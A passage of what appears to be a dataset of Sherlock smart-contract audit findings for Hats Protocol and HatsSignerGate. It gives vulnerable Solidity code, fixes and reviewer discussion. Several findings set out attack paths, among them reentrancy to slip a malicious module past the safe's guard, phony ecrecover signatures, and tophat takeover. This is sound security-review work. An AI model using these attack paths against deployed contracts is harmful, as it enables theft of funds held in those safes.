closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nGiven although the outcome is similar the underlying issues are different Considering #51, #104, and #130 as a separate issue.\nsherlock-admin\nEscalation accepted\nGiven although the outcome is similar the underlying issues are different Considering #51, #104, and #130 as a separate issue.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чThe safe can be permanently bricked and unable to perform transactions unless the hat wearers agree to renounce their hats.\nCode Snippet\nTool used\nManual Review
If another module adds a module, the safe will be brickedчhighч```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\nч"If a module is added by another module, it will bypass the `enableNewModule()` function that increments `enabledModuleCount`. This will throw off the module validation in `checkTransaction()` and `checkAfterExecution()` and could cause the safe to become permanently bricked.\nIn order to ensure that signers cannot add new modules to the safe (thus giving them unlimited future governing power), the guard portion of the gate checks that the hash of the modules before the transaction is the same as the hash after.\nBefore:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\n\nYou'll note that the ""before"" check uses `enabledModuleCount` and the ""after"" check uses `enabledModuleCount + 1`. The reason for this is that we want to be able to catch whether the user added a new module, which requires us taking a larger pagination to make sure we can view the additional module.\nHowever, if we were to start with a number of modules larger than `enabledModuleCount`, the result would be that the ""before"" check would clip off the final modules, and the ""after"" check would include them, thus leading to different hashes.\nThis situation can only arise if a module is added that bypasses the `enableModule()` function. But this exact situation can happen if one of the other modules on the safe adds a module to the safe.\nIn this case, the modules on the safe will increase but `enabledModuleCount` will not. This will lead to the ""before"" and ""after"" checks returning different arrays each time, and therefore disallowing transactions.\nThe only possible ways to fix this problem will be to have the other module remove the additional one they added. But, depending on the specific circumstances, this option may not be possible. For example, the module that performed the adding may not have the ability to remove modules."чThe module guarding logic needs to be rethought. Given the large number of unbounded risks it opens up, I would recommend not allowing other modules on any safes that use this functionality.\nDiscussion\nspengrah\nThis is definitely an issue. I can see a few potential approaches to addressing it:\nAs suggested, allow no other modules to exist alongside HSG. That would require checks in the factory as well as in `checkAfterExecution`. This approach would eliminate this issue fully, but would reduce flexibility for DAOs to customize how they use their Safes. For example, a common expected pattern is to use a Safe alongside a DAO that both the DAO (via a module; slow) and signers (via sigs; fast) can control. This wouldn't be possible if no additional modules could be added.\nAdd an onlyOwner `removeModules` function to enable the owner to true up the module count saved in storage if a module is added to the Safe via a different avenue.\nIn `checkTransaction`, count and store the number of modules that exist on the safe, then use that value as the page size for the check in `checkAfterExecution`. This would allow the Safe to have arbitrary number of modules, but for larger number of modules the gas size be fairly high — in `checkTransaction` we'd need to get the module addresses from the Safe in a while loop to ensure we count all of them.\ncc @zobront\nspengrah\nGoing with option 1 here\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/10чThe safe can be permanently bricked, with the guard functions disallowing any transactions. All funds in the safe will remain permanently stuck.\nCode Snippet\nTool used\nManual Review
Signers can bypass checks to add new modules to a safe by abusing reentrancyчhighч```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\nчThe `checkAfterExecution()` function has checks to ensure that new modules cannot be added by signers. This is a crucial check, because adding a new module could give them unlimited power to make any changes (with no guards in place) in the future. However, by abusing reentrancy, the parameters used by the check can be changed so that this crucial restriction is violated.\nThe `checkAfterExecution()` is intended to uphold important invariants after each signer transaction is completed. This is intended to restrict certain dangerous signer behaviors, the most important of which is adding new modules. This was an issue caught in the previous audit and fixed by comparing the hash of the modules before execution to the has of the modules after.\nBefore:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\n\nThis is further emphasized in the comments, where it is specified:\n/// @notice Post-flight check to prevent `safe` signers from removing this contract guard, changing any modules, or changing the threshold\nWhy Restricting Modules is Important\nModules are the most important thing to check. This is because modules have unlimited power not only to execute transactions but to skip checks in the future. Creating an arbitrary new module is so bad that it is equivalent to the other two issues together: getting complete control over the safe (as if threshold was set to 1) and removing the guard (because they aren't checked in module transactions).\nHowever, this important restriction can be violated by abusing reentrancy into this function.\nReentrancy Disfunction\nTo see how this is possible, we first have to take a quick detour regarding reentrancy. It appears that the protocol is attempting to guard against reentrancy with the `guardEntries` variable. It is incremented in `checkTransaction()` (before a transaction is executed) and decremented in `checkAfterExecution()` (after the transaction has completed).\nThe only protection it provides is in its risk of underflowing, explained in the comments as:\n// leave checked to catch underflows triggered by re-erntry attempts\nHowever, any attempt to reenter and send an additional transaction midstream of another transaction would first trigger the `checkTransaction()` function. This would increment `_guardEntries` and would lead to it not underflowing.\nIn order for this system to work correctly, the `checkTransaction()` function should simply set `_guardEntries = 1`. This would result in an underflow with the second decrement. But, as it is currently designed, there is no reentrancy protection.\nUsing Reentrancy to Bypass Module Check\nRemember that the module invariant is upheld by taking a snapshot of the hash of the modules in `checkTransaction()` and saving it in the `_existingModulesHash` variable.\nHowever, imagine the following set of transactions:\nSigners send a transaction via the safe, and modules are snapshotted to `_existingModulesHash`\nThe transaction uses the Multicall functionality of the safe, and performs the following actions:\nFirst, it adds the malicious module to the safe\nThen, it calls `execTransaction()` on itself with any another transaction\nThe second call will call `checkTransaction()`\nThis will update `_existingModulesHash` to the new list of modules, including the malicious one\nThe second call will execute, which doesn't matter (could just be an empty transaction)\nAfter the transaction, `checkAfterExecution()` will be called, and the modules will match\nAfter the full transaction is complete, `checkAfterExecution()` will be called for the first transaction, but since `_existingModulesHash` will be overwritten, the module check will passчUse a more typical reentrancy guard format, such as checking to ensure `_guardEntries == 0` at the top of `checkTransaction()` or simply setting `_guardEntries = 1` in `checkTransaction()` instead of incrementing it.\nDiscussion\nzobront\nEscalate for 10 USDC\nTo successfully duplicate a High Severity issue, it is required for an issue to meet a burden of proof of understanding the exploit.\n#67 clearly meets this burden of proof. It explains the same exploit described in this report and deserves to be duplicated with it.\n#105 and #124 do not explain any exploit. They simply noticed that the reentrancy guard wouldn't work, couldn't find a way to take advantage of that, and submitted it without a way to use it.\nMy recommendation is that they are not valid issues, but at the very least they should be moved to a separate Medium issue to account for the fact that they did not find a High Severity exploit.\nsherlock-admin\nEscalate for 10 USDC\nTo successfully duplicate a High Severity issue, it is required for an issue to meet a burden of proof of understanding the exploit.\n#67 clearly meets this burden of proof. It explains the same exploit described in this report and deserves to be duplicated with it.\n#105 and #124 do not explain any exploit. They simply noticed that the reentrancy guard wouldn't work, couldn't find a way to take advantage of that, and submitted it without a way to use it.\nMy recommendation is that they are not valid issues, but at the very least they should be moved to a separate Medium issue to account for the fact that they did not find a High Severity exploit.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ncducrest\nIt's a bit ambitious to have 4 issues describing the same line of codes as incorrect / vulnerable not being marked as duplicate, especially when they provide the same recommendation. I feel like going into such depths to describe the impact may not be necessary to ensure the safety of the protocol.\nHowever, I agree that it can also feel weird that we would be awarded the same while your issue provides much more details. I could not find anything in the Sherlock docs pertaining to this situation, but maybe there should be a reward for the best issue describing a vulnerability.\nWhen first submitting these issues, I feel like I may take the risk that the issue is treated as medium / low by not providing enough details. Perhaps are you already awarded for having provided such details by ensuring your issue is considered valid?\nhrishibhat\nEscalation accepted\nGiven that issues #41 & #67 have identified a valid attack path, considering #105 & #124 as a medium as it identifies underlying re-entrancy issue.\nNote: Sherlock will make note of the above comments and discuss internally to add additional instructions in the guide to help resolve such scenarios in the future.\nsherlock-admin\nEscalation accepted\nGiven that issues #41 & #67 have identified a valid attack path, considering #105 & #124 as a medium as it identifies underlying re-entrancy issue.\nNote: Sherlock will make note of the above comments and discuss internally to add additional instructions in the guide to help resolve such scenarios in the future.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чAny number of signers who are above the threshold will be able to give themselves unlimited access over the safe with no restriction going forward.\nCode Snippet\nTool used\nManual Review
Unlinked tophat retains linkedTreeRequests, can be ruggedчhighч```\nfunction requestLinkTopHatToTree(uint32 _topHatDomain, uint256 _requestedAdminHat) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n\n    _checkAdmin(fullTopHatId);\n\n    linkedTreeRequests[_topHatDomain] = _requestedAdminHat;\n    emit TopHatLinkRequested(_topHatDomain, _requestedAdminHat);\n}\n```\nч"When a tophat is unlinked from its admin, it is intended to regain its status as a tophat that is fully self-sovereign. However, because the `linkedTreeRequests` value isn't deleted, an independent tophat could still be vulnerable to ""takeover"" from another admin and could lose its sovereignty.\nFor a tophat to get linked to a new tree, it calls `requestLinkTopHatToTree()` function:\n```\nfunction requestLinkTopHatToTree(uint32 _topHatDomain, uint256 _requestedAdminHat) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n\n    _checkAdmin(fullTopHatId);\n\n    linkedTreeRequests[_topHatDomain] = _requestedAdminHat;\n    emit TopHatLinkRequested(_topHatDomain, _requestedAdminHat);\n}\n```\n\nThis creates a ""request"" to link to a given admin, which can later be approved by the admin in question:\n```\nfunction approveLinkTopHatToTree(uint32 _topHatDomain, uint256 _newAdminHat) external {\n    // for everything but the last hat level, check the admin of `_newAdminHat`'s theoretical child hat, since either wearer or admin of `_newAdminHat` can approve\n    if (getHatLevel(_newAdminHat) < MAX_LEVELS) {\n        _checkAdmin(buildHatId(_newAdminHat, 1));\n    } else {\n        // the above buildHatId trick doesn't work for the last hat level, so we need to explicitly check both admin and wearer in this case\n        _checkAdminOrWearer(_newAdminHat);\n    }\n\n    // Linkages must be initiated by a request\n    if (_newAdminHat != linkedTreeRequests[_topHatDomain]) revert LinkageNotRequested();\n\n    // remove the request -- ensures all linkages are initialized by unique requests,\n    // except for relinks (see `relinkTopHatWithinTree`)\n    delete linkedTreeRequests[_topHatDomain];\n\n    // execute the link. Replaces existing link, if any.\n    _linkTopHatToTree(_topHatDomain, _newAdminHat);\n}\n```\n\nThis function shows that if there is a pending `linkedTreeRequests`, then the admin can use that to link the tophat into their tree and claim authority over it.\nWhen a tophat is unlinked, it is expected to regain its sovereignty:\n```\nfunction unlinkTopHatFromTree(uint32 _topHatDomain) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n    _checkAdmin(fullTopHatId);\n\n    delete linkedTreeAdmins[_topHatDomain];\n    emit TopHatLinked(_topHatDomain, 0);\n}\n```\n\nHowever, this function does not delete `linkedTreeRequests`.\nTherefore, the following set of actions is possible:\nTopHat is linked to Admin A\nAdmin A agrees to unlink the tophat\nAdmin A calls `requestLinkTopHatToTree` with any address as the admin\nThis call succeeds because Admin A is currently an admin for TopHat\nAdmin A unlinks TopHat as promised\nIn the future, the address chosen can call `approveLinkTopHatToTree` and take over admin controls for the TopHat without the TopHat's permission"чIn `unlinkTopHatFromTree()`, the `linkedTreeRequests` should be deleted:\n```\nfunction unlinkTopHatFromTree(uint32 _topHatDomain) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n    _checkAdmin(fullTopHatId);\n\n    delete linkedTreeAdmins[_topHatDomain];\n// Add the line below\n   delete linkedTreeRequests[_topHatDomain];\n    emit TopHatLinked(_topHatDomain, 0);\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/113чTophats that expect to be fully self-sovereign and without any oversight can be surprisingly claimed by another admin, because settings from a previous admin remain through unlinking.\nCode Snippet\nTool used\nManual Review
Unbound recursive function call can use unlimited gas and break hats operationчmediumч```\n    function isAdminOfHat(address _user, uint256 _hatId) public view returns (bool isAdmin) {\n        uint256 linkedTreeAdmin;\n        uint32 adminLocalHatLevel;\n        if (isLocalTopHat(_hatId)) {\n            linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n            if (linkedTreeAdmin == 0) {\n                // tree is not linked\n                return isAdmin = isWearerOfHat(_user, _hatId);\n            } else {\n                // tree is linked\n                if (isWearerOfHat(_user, linkedTreeAdmin)) {\n                    return isAdmin = true;\n                } // user wears the treeAdmin\n                else {\n                    adminLocalHatLevel = getLocalHatLevel(linkedTreeAdmin);\n                    _hatId = linkedTreeAdmin;\n                }\n            }\n        } else {\n            // if we get here, _hatId is not a tophat of any kind\n            // get the local tree level of _hatId's admin\n            adminLocalHatLevel = getLocalHatLevel(_hatId) - 1;\n        }\n\n        // search up _hatId's local address space for an admin hat that the _user wears\n        while (adminLocalHatLevel > 0) {\n            if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, adminLocalHatLevel))) {\n                return isAdmin = true;\n            }\n            // should not underflow given stopping condition > 0\n            unchecked {\n                --adminLocalHatLevel;\n            }\n        }\n\n        // if we get here, we've reached the top of _hatId's local tree, ie the local tophat\n        // check if the user wears the local tophat\n        if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, 0))) return isAdmin = true;\n\n        // if not, we check if it's linked to another tree\n        linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n        if (linkedTreeAdmin == 0) {\n            // tree is not linked\n            // we've already learned that user doesn't wear the local tophat, so there's nothing else to check; we return false\n            return isAdmin = false;\n        } else {\n            // tree is linked\n            // check if user is wearer of linkedTreeAdmin\n            if (isWearerOfHat(_user, linkedTreeAdmin)) return true;\n            // if not, recurse to traverse the parent tree for a hat that the user wears\n            isAdmin = isAdminOfHat(_user, linkedTreeAdmin);\n        }\n    }\n```\nч"some of the functions in the Hats and HatsIdUtilities contracts has recursive logics without limiting the number of iteration, this can cause unlimited gas usage if hat trees has huge depth and it won't be possible to call the contracts functions. functions `getImageURIForHat()`, `isAdminOfHat()`, `getTippyTopHatDomain()` and `noCircularLinkage()` would revert and because most of the logics callings those functions so contract would be in broken state for those hats.\nThis is function `isAdminOfHat()` code:\n```\n    function isAdminOfHat(address _user, uint256 _hatId) public view returns (bool isAdmin) {\n        uint256 linkedTreeAdmin;\n        uint32 adminLocalHatLevel;\n        if (isLocalTopHat(_hatId)) {\n            linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n            if (linkedTreeAdmin == 0) {\n                // tree is not linked\n                return isAdmin = isWearerOfHat(_user, _hatId);\n            } else {\n                // tree is linked\n                if (isWearerOfHat(_user, linkedTreeAdmin)) {\n                    return isAdmin = true;\n                } // user wears the treeAdmin\n                else {\n                    adminLocalHatLevel = getLocalHatLevel(linkedTreeAdmin);\n                    _hatId = linkedTreeAdmin;\n                }\n            }\n        } else {\n            // if we get here, _hatId is not a tophat of any kind\n            // get the local tree level of _hatId's admin\n            adminLocalHatLevel = getLocalHatLevel(_hatId) - 1;\n        }\n\n        // search up _hatId's local address space for an admin hat that the _user wears\n        while (adminLocalHatLevel > 0) {\n            if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, adminLocalHatLevel))) {\n                return isAdmin = true;\n            }\n            // should not underflow given stopping condition > 0\n            unchecked {\n                --adminLocalHatLevel;\n            }\n        }\n\n        // if we get here, we've reached the top of _hatId's local tree, ie the local tophat\n        // check if the user wears the local tophat\n        if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, 0))) return isAdmin = true;\n\n        // if not, we check if it's linked to another tree\n        linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n        if (linkedTreeAdmin == 0) {\n            // tree is not linked\n            // we've already learned that user doesn't wear the local tophat, so there's nothing else to check; we return false\n            return isAdmin = false;\n        } else {\n            // tree is linked\n            // check if user is wearer of linkedTreeAdmin\n            if (isWearerOfHat(_user, linkedTreeAdmin)) return true;\n            // if not, recurse to traverse the parent tree for a hat that the user wears\n            isAdmin = isAdminOfHat(_user, linkedTreeAdmin);\n        }\n    }\n```\n\nAs you can see this function calls itself recursively to check that if user is wearer of the one of the upper link hats of the hat or not. if the chain(depth) of the hats in the tree become very long then this function would revert because of the gas usage and the gas usage would be high enough so it won't be possible to call this function in a transaction. functions `getImageURIForHat()`, `getTippyTopHatDomain()` and `noCircularLinkage()` has similar issues and the gas usage is depend on the tree depth. the issue can happen suddenly for hats if the top level topHat decide to add link, for example:\nHat1 is linked to chain of the hats that has 1000 ""root hat"" and the topHat (tippy hat) is TIPHat1.\nHat2 is linked to chain of the hats that has 1000 ""root hat"" and the topHat (tippy hat) is TIPHat2.\nadmin of the TIPHat1 decides to link it to the Hat2 and all and after performing that the total depth of the tree would increase to 2000 and transactions would cost double time gas."ч"
The Hats contract needs to override the ERC1155.balanceOfBatch functionчmediumч```\n    function balanceOf(address _wearer, uint256 _hatId)\n        public\n        view\n        override(ERC1155, IHats)\n        returns (uint256 balance)\n    {\n        Hat storage hat = _hats[_hatId];\n\n        balance = 0;\n\n        if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n            balance = super.balanceOf(_wearer, _hatId);\n        }\n    }\n```\nч"The Hats contract does not override the ERC1155.balanceOfBatch function\nThe Hats contract overrides the ERC1155.balanceOf function to return a balance of 0 when the hat is inactive or the wearer is ineligible.\n```\n    function balanceOf(address _wearer, uint256 _hatId)\n        public\n        view\n        override(ERC1155, IHats)\n        returns (uint256 balance)\n    {\n        Hat storage hat = _hats[_hatId];\n\n        balance = 0;\n\n        if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n            balance = super.balanceOf(_wearer, _hatId);\n        }\n    }\n```\n\nBut the Hats contract does not override the ERC1155.balanceOfBatch function, which causes balanceOfBatch to return the actual balance no matter what the circumstances.\n```\n    function balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n        public\n        view\n        virtual\n        returns (uint256[] memory balances)\n    {\n        require(owners.length == ids.length, ""LENGTH_MISMATCH"");\n\n        balances = new uint256[](owners.length);\n\n        // Unchecked because the only math done is incrementing\n        // the array index counter which cannot possibly overflow.\n        unchecked {\n            for (uint256 i = 0; i < owners.length; ++i) {\n                balances[i] = _balanceOf[owners[i]][ids[i]];\n            }\n        }\n    }\n```\n"чConsider overriding the ERC1155.balanceOfBatch function in Hats contract to return 0 when the hat is inactive or the wearer is ineligible.\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/102\nzobront\nReverting solves the problem, but I'm curious why revert instead of just replacing:\n```\nbalances[i] = _balanceOf[owners[i]][ids[i]];\n```\n\nwith...\n```\nbalances[i] = balanceOf(owners[i], ids[i]);\n```\n\nzobront\nReverting solves the problem, but I'm curious why revert instead of just replacing:\n```\nbalances[i] = _balanceOf[owners[i]][ids[i]];\n```\n\nwith...\n```\nbalances[i] = balanceOf(owners[i], ids[i]);\n```\nчThis will make balanceOfBatch return a different result than balanceOf, which may cause errors when integrating with other projects\nCode Snippet\nTool used\nManual Review
[Medium][Outdated State] `_removeSigner` incorrectly updates `signerCount` and safe `threshold`чmediumч```\n        if (validSignerCount == currentSignerCount) {\n            newSignerCount = currentSignerCount;\n        } else {\n            newSignerCount = currentSignerCount - 1;\n        }\n```\nч`_removeSigner` can be called whenever a signer is no longer valid to remove an invalid signer. However, under certain situations, `removeSigner` incorrectly reduces the number of `signerCount` and sets the `threshold` incorrectly.\n`_removeSigner` uses the code snippet below to decide if the number of `signerCount` should be reduced:\n```\n        if (validSignerCount == currentSignerCount) {\n            newSignerCount = currentSignerCount;\n        } else {\n            newSignerCount = currentSignerCount - 1;\n        }\n```\n\nIf first clause is supposed to be activated when `validSignerCount` and `currentSignerCount` are still in sync, and we want to remove an invalid signer. The second clause is for when we need to identify a previously active signer which is inactive now and want to remove it. However, it does not take into account if a previously in-active signer became active. In the scenario described below, the `signerCount` would be updated incorrectly:\n(1) Lets imagine there are 5 signers where 0, 1 and 2 are active while 3 and 4 are inactive, the current `signerCount = 3` (2) In case number 3 regains its hat, it will become active again (3) If we want to delete signer 4 from the owners' list, the `_removeSigner` function will go through the signers and find 4 valid signers, since there were previously 3 signers, `validSignerCount == currentSignerCount` would be false. (4) In this case, while the number of `validSingerCount` increased, the `_removeSigner` reduces one.чCheck if the number of `validSignerCount` decreased instead of checking equality:\n```\n@line 387 HatsSignerGateBase\n- if (validSignerCount == currentSignerCount) {\n+ if (validSignerCount >= currentSignerCount) {\n```\n\nDiscussion\nspengrah\nThis is another issue that can be avoided by using a dynamic `getSignerCount` instead of relying on the `signerCount` state variable.\ncc @zobront\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/6чThis can make the `signerCount` and safe `threshold` to update incorrectly which can cause further problems, such as incorrect number of signatures needed.\nCode Snippet\nNo code snippet provided\nTool used\nManual Review
Safe threshold can be set above target threshold, causing transactions to revertчmediumч```\nuint256 currentThreshold = safe.getThreshold();\nuint256 newThreshold;\nuint256 target = targetThreshold; // save SLOADs\n\nif (validSignerCount <= target && validSignerCount != currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\nif (newThreshold > 0) { // rest of code update safe threshold // rest of code }\n```\nчIf a `targetThreshold` is set below the safe's threshold, the `reconcileSignerCount()` function will fail to adjust the safe's threshold as it should, leading to a mismatch that causes all transactions to revert.\nIt is possible and expected that the `targetThreshold` can be lowered, sometimes even lower than the current safe threshold.\nIn the `setTargetThreshold()` function, there is an automatic update to lower the safe threshold accordingly. However, in the event that the `signerCount < 2`, it will not occur. This could easily happen if, for example, the hat is temporarily toggled off.\nBut this should be fine! In this instance, when a new transaction is processed, `checkTransaction()` will be called, which calls `reconcileSignerCount()`. This should fix the problem by resetting the safe's threshold to be within the range of `minThreshold` to `targetThreshold`.\nHowever, the logic to perform this update is faulty.\n```\nuint256 currentThreshold = safe.getThreshold();\nuint256 newThreshold;\nuint256 target = targetThreshold; // save SLOADs\n\nif (validSignerCount <= target && validSignerCount != currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\nif (newThreshold > 0) { // rest of code update safe threshold // rest of code }\n```\n\nAs you can see, in the event that the `validSignerCount` is lower than the target threshold, we update the safe's threshold to `validSignerCount`. That is great.\nIn the event that `validSignerCount` is greater than threshold, we should be setting the safe's threshold to `targetThreshold`. However, this only happens in the `else if` clause, when `currentThreshold < target`.\nAs a result, in the situation where `target < current <= validSignerCount`, we will leave the current safe threshold as it is and not lower it. This results in a safe threshold that is greater than `targetThreshold`.\nHere is a simple example:\nvalid signers, target threshold, and safe's threshold are all 10\nthe hat is toggled off\nwe lower target threshold to 9\nthe hat is toggled back on\n`if` block above (validSignerCount <= target && validSignerCount != currentThreshold) fails because `validSignerCount > target`\nelse `if` block above (validSignerCount > target && currentThreshold < target) fails because `currentThreshold > target`\nas a result, `newThreshold == 0` and the safe isn't updated\nthe safe's threshold remains at 10, which is greater than target threshold\nIn the `checkAfterExecution()` function that is run after each transaction, there is a check that the threshold is valid:\n```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n```\n\nThe `_getCorrectThreshold()` function checks if the threshold is equal to the valid signer count, bounded by the `minThreshold` on the lower end, and the `targetThreshold` on the upper end:\n```\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\n\nSince our threshold is greater than `targetThreshold` this check will fail and all transactions will revert.ч
If signer gate is deployed to safe with more than 5 existing modules, safe will be brickedчmediumч```\n(address[] memory modules,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\nuint256 existingModuleCount = modules.length;\n```\nч`HatsSignerGate` can be deployed with a fresh safe or connected to an existing safe. In the event that it is connected to an existing safe, it pulls the first 5 modules from that safe to count the number of connected modules. If there are more than 5 modules, it silently only takes the first five. This results in a mismatch between the real number of modules and `enabledModuleCount`, which causes all future transactions to revert.\nWhen a `HatsSignerGate` is deployed to an existing safe, it pulls the existing modules with the following code:\n```\n(address[] memory modules,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\nuint256 existingModuleCount = modules.length;\n```\n\nBecause the modules are requested paginated with `5` as the second argument, it will return a maximum of `5` modules. If the safe already has more than `5` modules, only the first `5` will be returned.\nThe result is that, while the safe has more than 5 modules, the gate will be set up with `enabledModuleCount = 5 + 1`.\nWhen a transaction is executed, `checkTransaction()` will get the hash of the first 6 modules:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter the transaction, the first 7 modules will be checked to compare it:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\n\nSince it already had more than 5 modules (now 6, with HatsSignerGate added), there will be a 7th module and the two hashes will be different. This will cause a revert.\nThis would be a high severity issue, except that in the comments for the function it says:\n/// @dev Do not attach HatsSignerGate to a Safe with more than 5 existing modules; its signers will not be able to execute any transactions\nThis is the correct recommendation, but given the substantial consequences of getting it wrong, it should be enforced in code so that a safe with more modules reverts, rather than merely suggested in the comments.чThe `deployHatsSignerGate()` function should revert if attached to a safe with more than 5 modules:\n```\nfunction deployHatsSignerGate(\n    uint256 _ownerHatId,\n    uint256 _signersHatId,\n    address _safe, // existing Gnosis Safe that the signers will join\n    uint256 _minThreshold,\n    uint256 _targetThreshold,\n    uint256 _maxSigners\n) public returns (address hsg) {\n    // count up the existing modules on the safe\n    (address[] memory modules,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\n    uint256 existingModuleCount = modules.length;\n// Add the line below\n   (address[] memory modulesWithSix,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 6);\n// Add the line below\n   if (modules.length != moduleWithSix.length) revert TooManyModules();\n\n    return _deployHatsSignerGate(\n        _ownerHatId, _signersHatId, _safe, _minThreshold, _targetThreshold, _maxSigners, existingModuleCount\n    );\n}\n```\n\nDiscussion\nspengrah\nBased on other findings, considering removing the ability for any other modules to exist alongside HSG. If we go that route, the fix here would likely be to revert if `modulesWith1.length > 0`.\ncc @zobront\nzobront\nGreat, I agree with that.\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/10чIf a HatsSignerGate is deployed and connected to a safe with more than 5 existing modules, all future transactions sent through that safe will revert.\nCode Snippet\nTool used\nManual Review
If a hat is owned by address(0), phony signatures will be accepted by the safeчmediumч```\nfunction isValidSigner(address _account) public view override returns (bool valid) {\n    valid = HATS.isWearerOfHat(_account, signersHatId);\n}\n```\nчIf a hat is sent to `address(0)`, the multisig will be fooled into accepting phony signatures on its behalf. This will throw off the proper accounting of signatures, allowing non-majority transactions to pass and potentially allowing users to steal funds.\nThe function uses `ecrecover` to get the signer. However, `ecrecover` is well known to return `address(0)` in the event that a phony signature is passed with a `v` value other than 27 or 28. See this example for how this can be done.\nIn the event that this is a base with only a single hat approved for signing, the `isValidSigner()` function will simply check if the owner is the wearer of a hat:\n```\nfunction isValidSigner(address _account) public view override returns (bool valid) {\n    valid = HATS.isWearerOfHat(_account, signersHatId);\n}\n```\n\n```\nfunction isWearerOfHat(address _user, uint256 _hatId) public view returns (bool isWearer) {\n    isWearer = (balanceOf(_user, _hatId) > 0);\n}\n```\n\n... which only checks if it is active or eligible...\n```\nfunction balanceOf(address _wearer, uint256 _hatId)\n    public\n    view\n    override(ERC1155, IHats)\n    returns (uint256 balance)\n{\n    Hat storage hat = _hats[_hatId];\n\n    balance = 0;\n\n    if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n        balance = super.balanceOf(_wearer, _hatId);\n    }\n}\n```\n\n... which calls out to ERC1155, which just returns the value in storage (without any address(0) check)...\n```\nfunction balanceOf(address owner, uint256 id) public view virtual returns (uint256 balance) {\n    balance = _balanceOf[owner][id];\n}\n```\n\nThe result is that, if a hat ends up owned by `address(0)` for any reason, this will give blanket permission for anyone to create a phony signature that will be accepted by the safe.\nYou could imagine a variety of situations where this may apply:\nAn admin minting a mutable hat to address(0) to adjust the supply while waiting for a delegatee to send over their address to transfer the hat to\nAn admin sending a hat to address(0) because there is some reason why they need the supply slightly inflated\nAn admin accidentally sending a hat to address(0) to burn it\nNone of these examples are extremely likely, but there would be no reason for the admin to think they were putting their multisig at risk for doing so. However, the result would be a free signer on the multisig, which would have dramatic consequences.чThe easiest option is to add a check in `countValidSignatures()` that confirms that `currentOwner != address(0)` after each iteration.чIf a hat is sent to `address(0)`, any phony signature can be accepted by the safe, leading to transactions without sufficient support being executed.\nThis is particularly dangerous in a 2/3 situation, where this issue would be sufficient for a single party to perform arbitrary transactions.\nCode Snippet\nTool used\nManual Review
